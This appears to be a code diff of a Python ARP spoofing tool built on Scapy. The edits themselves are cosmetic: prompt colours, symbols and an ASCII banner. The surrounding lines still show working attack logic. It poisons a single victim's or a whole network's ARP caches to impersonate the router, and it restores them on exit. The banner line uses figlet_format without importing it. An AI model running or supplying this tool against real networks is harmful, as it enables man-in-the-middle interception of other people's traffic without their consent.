@@ -18,6 +18,7 @@ import socket
 import os
 import time
 import argparse
+from termcolor import cprint
 
 
 # Restore the network
@@ -26,7 +27,7 @@ def signal_handler(sig, frame):
   global routeur_ip
   global victim_mac
   global routeur_mac    
-  print("\033[1;32m \n [!] Restoring the victim's network")
+  print("\033[1;32m \n [/!\] Restoring the victim's network")
   send(ARP(pdst=victim_ip, macdst=victim_mac, psrc=routeur_ip, macsrc=routeur_mac, op=2), count=5, inter=.2)
 
   sys.exit(0)
@@ -55,7 +56,7 @@ def arp_spoof1():
 
 def arp_sniffing1(pkt):
     if pkt[ARP].op == 1:  # is-at (response)
-        print('\033[3;32m \n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+        print('\033[3;32m \n\n[+] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
         arp_spoof1()
 
 
@@ -99,13 +100,13 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
 
 def arp_sniffing2(pkt):
   if pkt[ARP].op == 1:  # is-at (response)
-        print('\033[3;32m \n\n[i] Response of : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
+        print('\033[3;32m \n\n[+] Response of : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
         arp_spoof2()
 
 
 #------------------------------------------------ MAIN PROGRAM --------------------------------------------------
 
-print('[*] Starting ARP Spoofing Program... [*]')
+print('\033[1;32m  [+] Starting ARP Spoofing Program... [*]')
 
 #------------------------------------- ARGUMENTS ----------------------------------------
 parser = argparse.ArgumentParser()
@@ -119,7 +120,8 @@ args = parser.parse_args()
 
 
 # Interface input
-print("\033[3;31m All credits to NextGenSpoofer  \n")
+cprint(figlet_format('arp spoffer', font='bloody'),'red', attrs=['bold'])
+print("\033[3;31m © All credits to NextGenSpoofer  \n")
 print("\033[1;33m Interface :")
 iface=input()
 
@@ -128,7 +130,7 @@ me_ip = get_if_addr(iface)
 me_mac = get_if_hwaddr(iface)
 
 # Print our infos (hacker)
-print('\033[3;31m \n[i] Your IP address : ( {0} ) and your MAC address : ( {1} )'.format(me_ip, me_mac))
+print('\033[3;31m \n[i] My IP address : ( {0} ) \n [i] My MAC address : ( {1} )'.format(me_ip, me_mac))
 
 # Router global definition 
 routeur_ip=conf.route.route("0.0.0.0")[2]
@@ -147,25 +149,25 @@ routeur_mac = x.hwsrc
 try:
   if args.a:
     
-    print("\033[1;34m Network IPv4 :")
+    print("\033[1;34m Network IP(v4) :")
     victim_ip= input()
     
-    print("\033[3;31m \n[*] Attacking the network %s on iface %s [*]"%(victim_ip, iface))
-    print('[i] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
+    print("\033[3;31m \n[+] Attacking the network %s on iface %s [*]"%(victim_ip, iface))
+    print('[+] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
     all()
 
   # Single victim attack 
   if args.s:
-    print("Victim IPv4 :")
+    print("Victim IP(v4) :")
     victim_ip=input()
     x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) # Since it is a single victim, we need its MAC (for the signal_handler function)
     victim_mac = x.hwsrc
 
-    print('\033[3;31m \n[i] Attacking the victim ( {0} ), MAC address ( {1} )'.format(victim_ip, victim_mac))
-    print('[i] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
+    print('\033[3;31m \n[+] Attacking the victim ( {0} ), MAC address ( {1} )'.format(victim_ip, victim_mac))
+    print('[+] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
     single() 
 
 except:
-  print("\033[1;41m [!] Closing program...")
+  print("\033[1;41m [/!\] Closing program...")
                  
 # Stop program with CTRL+C
